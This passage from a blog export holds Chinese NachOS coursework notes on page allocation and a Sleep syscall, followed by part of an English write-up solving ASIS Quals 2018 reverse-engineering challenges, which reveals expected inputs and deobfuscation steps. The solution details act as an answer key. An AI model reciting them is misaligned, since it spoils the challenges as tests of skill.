TranslationEntry[NumPhysPages]; for (unsigned int i = 0; i &lt; NumPhysPages; i++) &#123; pageTable[i].virtualPage = i; // for now, virt page # = phys page # pageTable[i].physicalPage = i;// pageTable[i].physicalPage = 0; pageTable[i].valid = TRUE;// pageTable[i].valid = FALSE; pageTable[i].use = FALSE; pageTable[i].dirty = FALSE; pageTable[i].readOnly = FALSE; &#125; // 清空記憶體，但是不知道為什麼被註解掉了。// bzero(kernel-&gt;machine-&gt;mainMemory, MemorySize);&#125; 接下來在 AddrSpace::Load 中我們有這樣一個 ASSERT，numPages 就是程式所需要的 page 數量，用來判斷是否有超過實體記憶體的大小，超過就噴exception，因為等等我們要把記憶體分給多個程式，我們要改成 &lt;= 空閒的 page 才對。 code/userprog/addrspace.ccASSERT(numPages &lt;= NumPhysPages); 在往後一點我們有一段 code 把我們的 code 段跟 data 段 load 進記憶體，但是這裡填的是 virtualAddr ，本來這樣填是因為虛擬記憶體本沒做事，完全跟實體記憶體一樣 —— 還記得建構式裡 pageTable[i].virtualPage = i; // for now, virt page # = phys page #？但現在我們必須要換算虛擬記憶體對應的實體記憶體位置再讀入這樣才是正確的。 code/userprog/addrspace.cc// then, copy the code and data segments into memoryif (noffH.code.size &gt; 0) &#123; DEBUG(&#x27;a&#x27;, &quot;Initializing code segment, at 0x%x, size %d\\n&quot;,noffH.code.virtualAddr, noffH.code.size); executable-&gt;ReadAt(&amp;(machine-&gt;mainMemory[noffH.code.virtualAddr]),noffH.code.size, noffH.code.inFileAddr);&#125;if (noffH.initData.size &gt; 0) &#123; DEBUG(&#x27;a&#x27;, &quot;Initializing data segment, at 0x%x, size %d\\n&quot;,noffH.initData.virtualAddr, noffH.initData.size); executable-&gt;ReadAt(&amp;(machine-&gt;mainMemory[noffH.initData.virtualAddr]),noffH.initData.size, noffH.initData.inFileAddr);&#125; 因此先新增兩 static 變數（ static 是這個 class 所共享），用來記錄所有實體頁的使用狀況，以及當前還有多少實體頁是可以使用的，並記得在 addrspace.cc 中對 static 變數做初始化。 code/userprog/addrspace.hclass AddrSpace &#123; ... private: ... static bool PhyPageStatus[NumPhysPages]; static int NumFreePages;&#125; code/userprog/addrspace.cc#define PAGE_OCCU true#define PAGE_FREE falsebool AddrSpace::PhyPageStatus[NumPhysPages] = &#123;PAGE_FREE&#125;;int AddrSpace::NumFreePages = NumPhysPages; 並且根據剛剛提到的每一點對 addrspace.cc 做修改。 清除建構式把沒必要的映射拿掉： code/userprog/addrspace.ccAddrSpace::AddrSpace()&#123;&#125; 分配實體頁這邊可以自己維護一個 pool ，把剛 free 掉的 page 用 linklist 存起來，要用就先去這個地方找，不過沒關係，我們就用最樸素（ naive ）的方法 —— 一個一個看，有可以用的就直接抓來用。 這邊我用了 bzero(&amp;kernel-&gt;machine-&gt;mainMemory[idx * PageSize], PageSize); 來清零分配到的 page，因為我沒看載入的實作（ ReadAt ），但是正常放入 memory 時，如果程式不滿一個 page ，那應該要有 Null Padding ，先把記憶體清零就能保證剩餘的部分都是零了。 code/userprog/addrspace.ccbool AddrSpace::Load(char *fileName)&#123; ... //檢查是否有足夠的空閒實體頁 ASSERT(numPages &lt;= NumFreePages); //進行分配 pageTable = new TranslationEntry[numPages]; for(unsigned int i = 0, idx = 0; i &lt; numPages; i++) &#123; pageTable[i].virtualPage = i; while(idx &lt; NumPhysPages &amp;&amp; AddrSpace::PhyPageStatus[idx] == PAGE_OCCU) idx++; AddrSpace::PhyPageStatus[idx] = PAGE_OCCU; AddrSpace::NumFreePages--; //清空即將分配的 page bzero(&amp;kernel-&gt;machine-&gt;mainMemory[idx * PageSize], PageSize); pageTable[i].physicalPage = idx; pageTable[i].valid = true; pageTable[i].use = false; pageTable[i].dirty = false; pageTable[i].readOnly = false; &#125; DEBUG(dbgAddr, &quot;Initializing address space: &quot; &lt;&lt; numPages &lt;&lt; &quot;, &quot; &lt;&lt; size); ...&#125; 更改讀取位置本來是直接放入檔案結構裡面紀錄的 virtualAddr ，但是那是因為還沒有設定好，這裡我們要找出映射後的實體位置，所以我們抓 virtualAddr先除 PageSize 求得是第幾個 page，然後索引 pageTable 找到對應的實體頁是第幾頁，接著乘上每個 page 的大小得到該實體頁的實體記憶體，這時我們已經知道在第幾個實體頁了，不過我們不知道在這一頁的哪裡，所以我們拿本來的 virtualAddr mod PageSize 求得在 page 內的偏移，加上剛剛拿到的實體頁，就是對應的實體位址。 code/userprog/addrspace.ccbool AddrSpace::Load(char *fileName)&#123; ... DEBUG(dbgAddr, &quot;Initializing address space: &quot; &lt;&lt; numPages &lt;&lt; &quot;, &quot; &lt;&lt; size); if (noffH.code.size &gt; 0) &#123; DEBUG(dbgAddr, &quot;Initializing code segment.&quot;); DEBUG(dbgAddr, noffH.code.virtualAddr &lt;&lt; &quot;, &quot; &lt;&lt; noffH.code.size); executable-&gt;ReadAt( &amp;(kernel-&gt;machine-&gt;mainMemory[pageTable[noffH.code.virtualAddr/PageSize].physicalPage * PageSize + (noffH.code.virtualAddr%PageSize)]), noffH.code.size, noffH.code.inFileAddr); &#125; if (noffH.initData.size &gt; 0) &#123; DEBUG(dbgAddr, &quot;Initializing data segment.&quot;); DEBUG(dbgAddr, noffH.initData.virtualAddr &lt;&lt; &quot;, &quot; &lt;&lt; noffH.initData.size); executable-&gt;ReadAt( &amp;(kernel-&gt;machine-&gt;mainMemory[pageTable[noffH.initData.virtualAddr/PageSize].physicalPage * PageSize + (noffH.initData.virtualAddr%PageSize)]), noffH.initData.size, noffH.initData.inFileAddr); &#125; delete executable; // close file return TRUE; // success&#125; 釋放實體頁執行結束，釋放掉我們使用的實體頁，後面的程式才能使用。 code/userprog/addrspace.ccAddrSpace::~AddrSpace()&#123; //釋放本程式佔用的實體頁 for(int i = 0; i &lt; numPages; i++)&#123; AddrSpace::PhyPageStatus[pageTable[i].physicalPage] = PAGE_FREE; AddrSpace::NumFreePages++; &#125; delete pageTable;&#125; 測試修改後執行就正常了 $ ./nachos -e ../test/test1 -e ../test/test2Total threads number is 2Thread ../test/test1 is executing.Thread ../test/test2 is executing.Print integer:9Print integer:8Print integer:7Print integer:20Print integer:21Print integer:22Print integer:23Print integer:24Print integer:6return value:0Print integer:25return value:0No threads ready or runnable, and no pending interrupts.Assuming the program completed.Machine halting!Ticks: total 300, idle 8, system 70, user 222Disk I/O: reads 0, writes 0Console I/O: reads 0, writes 0Paging: faults 0Network I/O: packets received 0, sent 0 System call : Sleepsyscall 主要流程首先我們要先幫我們的 syscall 編號，然後用組語定義 sleep 的行為（因為要用到組語的 syscall ，當然你也可以用 gcc 的內聯組語，但是沒必要），就是讓 c++ 跟 mips 中的 function 互相呼叫，所以在 compile 的時候要讓他們知道 symbol 在哪裡。 code/userprog/syscall.h#define SC_ThreadFork 9#define SC_ThreadYield 10#define SC_PrintInt 11#define SC_Sleep 12...void PrintInt(int number); //my System Callvoid Sleep(int number); 他 lib 放的位置有點詭異，不過這就是自己實作的 c library，自己刻作業系統的話也會碰到\u001d（MyLittle-OS），這裡我們要把 Sleep 這個 symbol 導出，這樣 c++ 寫的部分才能找得到，因此有 .globl Sleep，而.ent Sleep是說 Sleep 的 entry 在這裡。 這裡還不算 syscall ，就只是一個系統 API，只是把 syscall 編號放進 $2，然後進行 syscall，這裡還沒有陷入核心。 code/test/start.s/* Start.s * * Assembly language assist for user programs running on top of Nachos. * ...*/... .globl Sleep .ent SleepSleep: addiu $2,$0,SC_Sleep syscall j $31 .end Sleep 在進行完 syscall ，陷入核心後，NachOS 負責處理這塊的是 exception.cc，我們要來定義收到 SC_Sleep 這個 syscall 編號的時候所要做的行為。從其他本來定義好的 case 來看，傳參應該是放在 4，所以我們也照著做，然後這裡要說一下中斷。 code/userprog/exception.cc// exception.cc // Entry point into the Nachos kernel from user programs.// There are two kinds of things that can cause control to// transfer back to here from user code:// case SC_PrintInt: val=kernel-&gt;machine-&gt;ReadRegister(4); cout &lt;&lt; &quot;Print integer:&quot; &lt;&lt;val &lt;&lt; endl; return; case SC_Sleep: val=kernel-&gt;machine-&gt;ReadRegister(4); cout &lt;&lt; &quot;Sleep Time:&quot; &lt;&lt; val &lt;&lt; &quot;(ms)&quot; &lt;&lt; endl; kernel-&gt;alarm-&gt;WaitUntil(val); return; 中斷常式在開發作業系統的時候我們可以透過中斷控制器，例如 Intel 8259A，來遮蔽某些中斷訊號，其中包括時脈，如果我們不遮蔽它的話，處理器就會收到源源不斷的時脈中斷，NachOS有用軟體做類似的事情，而外部這個時脈，就是用軟體模擬的。 code/machine/timer.cc// timer.cc // Routines to emulate a hardware timer device.//// A hardware timer generates a CPU interrupt every X milliseconds.// This means it can be used for implementing time-slicing.// 中斷的運作是這樣的，發生中斷 -&gt; 作業系統找到中斷向量 -&gt; 執行對應中斷常式，這裡時脈對應的中斷常式在 NachOS 裡面是 Alarm，Alarm中本來就有定義 WaitUntil，我們要利用這個 function 來實作 sleep，也就是每次時脈中斷觸發中斷常式的時候我們進行計數，當計數到達我們指定的 sleep 時間後，就把該 Thread 再次放回 Read Queue 裡面等待執行。 在執行中斷的時候有分為上半部跟下半部，上半部是較緊急的部分，要馬上處理，所以要在關中斷的狀態下執行（不接受其他中斷），下半部則沒這麼急，可以在開中斷的情況下處理。 本來我們應該要在 Scheduler 的地方實作 sleepList 才是正確的，不過這裡先求快速，實作一個塞在 Alarm 裡面的 sleepList 就好。 code/threads/alarm.h// alarm.h // Data structures for a software alarm clock.//// We make use of a hardware timer device, that generates// an interrupt every X time ticks (on real systems, X is// usually between 0.25 - 10 milliseconds).//// From this, we provide the ability for a thread to be// woken up after a delay; we also provide time-slicing.//// NOTE: this abstraction is not completely implemented.//// Copyright (c) 1992-1996 The Regents of the University of California.// All rights reserved. See copyright.h for copyright notice and limitation // of liability and disclaimer of warranty provisions.#ifndef ALARM_H#define ALARM_H#include &quot;copyright.h&quot;#include &quot;utility.h&quot;#include &quot;callback.h&quot;#include &quot;timer.h&quot;#include &lt;list&gt;#include &quot;thread.h&quot;class sleepList &#123; public: sleepList():_current_interrupt(0) &#123;&#125;; void PutToSleep(Thread *t, int x); bool PutToReady(); bool IsEmpty(); private: class sleepThread &#123; public: sleepThread(Thread* t, int x): sleeper(t), when(x) &#123;&#125;; Thread* sleeper; int when; &#125;; int _current_interrupt; std::list&lt;sleepThread&gt; _threadlist;&#125;;// The following class defines a software alarm clock. class Alarm : public CallBackObj &#123; public: Alarm(bool doRandomYield); // Initialize the timer, and callback // to &quot;toCall&quot; every time slice. ~Alarm() &#123; delete timer; &#125; void WaitUntil(int x); // suspend execution until time &gt; now + x private: Timer *timer; // the hardware timer device sleepList _sleepList; void CallBack(); // called when the hardware // timer generates an interrupt&#125;;#endif // ALARM_H 然後把 function 填好，相關註釋放在 code 裡面。 這裡其實可以做得更好一點，就是每次在插入時就照順序插入，這樣在檢查要不要喚醒 Thread 的時候，就可以不用檢查到最後，只要發現現在這個 Thread 還不能喚醒，後面的也都不能喚醒 code/threads/alarm.ccvoid Alarm::CallBack() &#123; Interrupt *interrupt = kernel-&gt;interrupt; MachineStatus status = interrupt-&gt;getStatus(); bool woken = _sleepList.PutToReady(); //如果沒有程式需要計數了，就把時脈中斷遮蔽掉 if (status == IdleMode &amp;&amp; !woken &amp;&amp; _sleepList.IsEmpty()) &#123;// is it time to quit? if (!interrupt-&gt;AnyFutureInterrupts()) &#123; timer-&gt;Disable(); // turn off the timer &#125; &#125; else &#123; // there&#x27;s someone to preempt interrupt-&gt;YieldOnReturn(); &#125;&#125;void Alarm::WaitUntil(int x) &#123; //關中斷 IntStatus oldLevel = kernel-&gt;interrupt-&gt;SetLevel(IntOff); Thread* t = kernel-&gt;currentThread; cout &lt;&lt; &quot;Alarm::WaitUntil go sleep&quot; &lt;&lt; endl; _sleepList.PutToSleep(t, x); //開中斷 kernel-&gt;interrupt-&gt;SetLevel(oldLevel);&#125;bool sleepList::IsEmpty() &#123; return _threadlist.size() == 0;&#125;void sleepList::PutToSleep(Thread*t, int x) &#123; ASSERT(kernel-&gt;interrupt-&gt;getLevel() == IntOff); _threadlist.push_back(sleepThread(t, _current_interrupt + x)); t-&gt;Sleep(false);&#125;bool sleepList::PutToReady() &#123; bool woken = false; _current_interrupt ++; for(std::list&lt;sleepThread&gt;::iterator it = _threadlist.begin(); it != _threadlist.end(); ) &#123; if(_current_interrupt &gt;= it-&gt;when) &#123; woken = true; cout &lt;&lt; &quot;sleepList::PutToReady Thread woken&quot; &lt;&lt; endl; kernel-&gt;scheduler-&gt;ReadyToRun(it-&gt;sleeper); it = _threadlist.erase(it); &#125; else &#123; it++; &#125; &#125; return woken;&#125; 測試撰寫兩個有用到 sleep 的程式，檢查正確性，這裡讓 sleep2 的週期是 sleep 的 $\\frac{1}{10}$，然後要修改 Makefile 把兩隻程式加入編譯，還要把 coff 轉成 NachOS 自己定義的 noff 格式。 code/test/sleep.c#include &quot;syscall.h&quot;main() &#123; int i; for(i = 0; i &lt; 5; i++) &#123; Sleep(1000000); PrintInt(2222); &#125; return 0;&#125; code/test/sleep2.c#include &quot;syscall.h&quot;main() &#123; int i; for(i = 0; i &lt; 20; i++) &#123; Sleep(100000); PrintInt(10); &#125; return 0;&#125; code/test/Makefileall: halt shell matmult sort test1 test2 sleep sleep2...sleep: sleep.o start.o $(LD) $(LDFLAGS) start.o sleep.o -o sleep.coff ../bin/coff2noff sleep.coff sleepsleep2: sleep2.o start.o $(LD) $(LDFLAGS) start.o sleep2.o -o sleep2.coff ../bin/coff2noff sleep2.coff sleep2 make 後執行 ./nachos -e ../test/sleep -e ../test/sleep2 正確的話前兩次會參雜 10 次的 PrintInt(10) 才執行一次的 PrintInt(2222) Total threads number is 2Thread ../test/sleep is executing.Thread ../test/sleep2 is executing.Sleep Time:1000000(ms)Alarm::WaitUntil go sleepSleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokensleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepPrint integer:2222Sleep Time:1000000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:10Sleep Time:100000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokensleepList::PutToReady Thread wokenPrint integer:10return value:0Print integer:2222Sleep Time:1000000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:2222Sleep Time:1000000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:2222Sleep Time:1000000(ms)Alarm::WaitUntil go sleepsleepList::PutToReady Thread wokenPrint integer:2222return value:0No threads ready or runnable, and no pending interrupts.Assuming the program completed.Machine halting! 遭遇的困難我找不到 code 放在哪裡Ｒ，是沒有 document 還是故意沒有 document，我猜是故意沒有的","categories":[{"name":"Note","slug":"Note","permalink":"http://blog.terrynini.tw/categories/Note/"}],"tags":[{"name":"OS","slug":"OS","permalink":"http://blog.terrynini.tw/tags/OS/"}]},{"title":"2018::ASIS-Quals::reverse","slug":"2018-ASIS-Quals-reverse","date":"2018-05-04T06:00:11.000Z","updated":"2024-06-20T16:46:01.064Z","comments":true,"path":"en/2018-ASIS-Quals-reverse/","permalink":"http://blog.terrynini.tw/en/2018-ASIS-Quals-reverse/","excerpt":"Another excuse, I had my wisdom tooth extracted, or I could solve them(rev) all.","text":"Another excuse, I had my wisdom tooth extracted, or I could solve them(rev) all. WarmUpObviously, it’s a C program which was compacted to one line with some #define.After formatted, it looks like: #include &lt;stdint.h&gt;#define M 37#define q (2+M/M)#define v (q/q)#define ef ((v+q)/2)#define f (q-v-ef)#define k (8-ef)struct b &#123; int64_t y[13];&#125; S;int m = 1811939329, N = 1, t[1 &lt;&lt; 26] = &#123;2&#125;, a, * p, i, e = 73421233, s, c, U = 1;g(d, h) &#123; for (i = s; i &lt; 1 &lt;&lt; 25; i *= 2) d = d * 1 LL * d % m; for (p = t; p &lt; t + N; p += s) for (i = s, c = 1; i; i--) a = p[s] * (h ? c : 1 LL) % m, p[s] = (m * 1 U + * p - a) * (h ? 1 LL : c) % m, * p = (a * 1 U + * p) % m, p++, c = c * 1 LL * d % m;&#125;l() &#123; while (e /= 2) &#123; N *= 2; U = U * 1 LL * (m + 1) / 2 % m; for (s = N; s /= 2;) g(136, 0); for (p = t; p &lt; t + N; p++) * p = * p * 1 LL * * p % m * U % m; for (s = 1; s &lt; N; s *= 2) g(839354248, 1); for (a = 0, p = t; p &lt; t + N;) a += * p &lt;&lt; (e &amp; 1), * p++ = a % 10, a /= 10; &#125;&#125;z(n) &#123; int y = 3, j, c; for (j = 2; j &lt;= n;) &#123; l(); for (c = 2; c &lt;= y - 1; c++) &#123; l(); if (y % c == 0) break; &#125; if (c == y) &#123; l(); j++; &#125; y++; &#125; l(); return y - 1;&#125;main(a, pq) char * pq; &#123; int b = sizeof(S), y = b, j = M; l(); int x[M] = &#123; b - M - sizeof((short int) a), (b &gt;&gt; v) + (k &lt;&lt; v) + (v &lt;&lt; (q | ef)) + z(v + (ef &lt;&lt; v)), (z(k * ef) &lt;&lt; v) - pow(ef, f), z(((j - ef * k) | (ef &lt;&lt; k &gt;&gt; v) / k - ef &lt;&lt; v) - ef), (((y + M) &amp; b) &lt;&lt; (k / q + ef)) - z(ef + v), ((ef &lt;&lt; k) - v) &amp; y, y * v + v, (ef &lt;&lt; (q * ef - v - (k &gt;&gt; ef))) * q - v, (f &lt;&lt; q) | (ef &lt;&lt; (q * f + k)) - j + k, (z(z(z(z(z(v))))) * q) &amp; (((j / q) - (ef &lt;&lt; v)) &lt;&lt; q) | (j + (q | (ef &lt;&lt; v))), y | (q + v), (ef &lt;&lt; ef) - v + ef * (((j &gt;&gt; ef) | j) - v + ef - q + v), (z(j &amp; (b &lt;&lt; ef)) &amp; (z(v &lt;&lt; v) &lt;&lt; k)) - (q &lt;&lt; v) - q, (k &lt;&lt; q) + q, (z(y) &gt;&gt; (ef &lt;&lt; v)) + (z(k + v)) - q, (z(z(k &amp; ef | j)) &amp; b | ef | v &lt;&lt; f &lt;&lt; q &lt;&lt; v &amp; ef &gt;&gt; k | q &lt;&lt; ef &lt;&lt; v | k | q) + z(v &lt;&lt; v) + v, (ef &gt;&gt; v) * q * z(k - v) + z(ef &lt;&lt; ef &amp; q | k) + ef, z(k &lt;&lt; k) &amp; v &amp; k | y + k - v, z(f &gt;&gt; ef | k &gt;&gt; ef | v | k) * (ef &gt;&gt; v) * q, (ef &lt;&lt; k - ef &lt;&lt; v &gt;&gt; q &lt;&lt; ef * ef) - j + (ef &lt;&lt; v), z(ef * k) * z(v &lt;&lt; v) + k - v, z((z(k) &lt;&lt; z(v))) &amp; y | k | v, z(ef &lt;&lt; ef &lt;&lt; v &lt;&lt; v) / ef + z(v &lt;&lt; ef | k | (b &gt;&gt; q) &amp; y - f) - (ef &lt;&lt; q) + (k - v) - ef, k &lt;&lt; (ef + q) / z(ef) * z(q) &amp; z(k &lt;&lt; k) | v, ((z(y | j &gt;&gt; k * ef)) % ef &lt;&lt; z(v &lt;&lt; v &lt;&lt; v) &gt;&gt; q &lt;&lt; q | j) / ef + v, (j - ef &lt;&lt; ef &lt;&lt; v * z(v &gt;&gt; v &lt;&lt; v) &gt;&gt; ef) / ef % z(k &lt;&lt; j) + q, z(k - v) + k | z(ef &lt;&lt; k &gt;&gt; v &lt;&lt; f) - z(q &lt;&lt; q) * ef &gt;&gt; v, (z(ef | y &amp; j | k) % q | j + ef &lt;&lt; z(k | ef) % k &lt;&lt; q | ef | k &lt;&lt; ef &lt;&lt; q / ef | y / ef + j &gt;&gt; q) &amp; k &lt;&lt; j | ef + v, 84, z(v * ef &lt;&lt; ef &lt;&lt; q) * q % ef &lt;&lt; k | k | q - v, ((z(20) * v) | (f &gt;&gt; q) | (k &lt;&lt; k)) / ef - (ef &lt;&lt; (v * q + ef)) - (k &lt;&lt; q) + z(k) - q &#125;; while (j--) &#123; putchar(x[M - v - j]); &#125; printf(&quot; From ASIS With Love &lt;3\\n&quot;); return 0;&#125; It just do some calculate then ouput the flag, but it took lots of time.I found that function l and function g, they are basically doing nothing.I deleted the function l, g ,and local variables int m = 1811939329, N = 1, t[1 &lt;&lt; 26] = &#123;2&#125;, a, * p, i, e = 73421233, s, c, U = 1;,after compilation &amp; execution, the flag popped out immediately. Baby CThis binary was obfuscated by movfuscator, and it’s my first time to solve such challenge, so that I did not realize that this was obfuscated at first time…… Using gdb, I found that uses sigaction to register callback function for SIGSEGV, SIGILL, then the binary will try to trigger them by accessing invalid address, so the binary can jump into libc to execute strncmp to compare that wether the input[3:14] equals to m0vfu3c4t0r! or not. I used demovfuscator to deobfuscate the binary, but there were still so much mov in binary. I thought the description of challenge, This babyc needed swaddling!,means that it used movfuscator more than one time,but I was wrong….Since the tool is still in development phase, I only used the function to generate flow chat. (You can solve this challenge without any deobfuscator, it’s not so hard) Before every branch, the corresponding char would show up many times. So I got the flag. EchoPutting it into IDA, I realized that this is actually a brainfuck interpretor.And I found a flag string in binary. Also, I found the brainfuck hard coded in this binary by gdb: &gt;&gt;[&lt;+&lt;+&gt;&gt;-]&lt;&lt;[-&gt;&gt;+&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;[&lt;&lt;+&lt;+&gt;&gt;&gt;-]&lt;&lt;&lt;[-&gt;&gt;&gt;+&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;+&lt;+&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;+&lt;+&gt;&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;[&lt;+&lt;+&gt;&gt;-]&lt;&lt;[-&gt;&gt;+&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;[&lt;&lt;+&lt;+&gt;&gt;&gt;-]&lt;&lt;&lt;[-&gt;&gt;&gt;+&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;+&lt;+&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;+&lt;+&gt;&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;[&lt;+&lt;+&gt;&gt;-]&lt;&lt;[-&gt;&gt;+&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;[&lt;&lt;+&lt;+&gt;&gt;&gt;-]&lt;&lt;&lt;[-&gt;&gt;&gt;+&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;+&lt;+&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;+&lt;+&gt;&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;[&lt;+&lt;+&gt;&gt;-]&lt;&lt;[-&gt;&gt;+&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;[&lt;&lt;+&lt;+&gt;&gt;&gt;-]&lt;&lt;&lt;[-&gt;&gt;&gt;+&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;+&lt;+&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;+&lt;+&gt;&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;[&lt;+&lt;+&gt;&gt;-]&lt;&lt;[-&gt;&gt;+&lt;&lt;]&gt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&gt;&gt;&gt;[&lt;&lt;+&lt;+&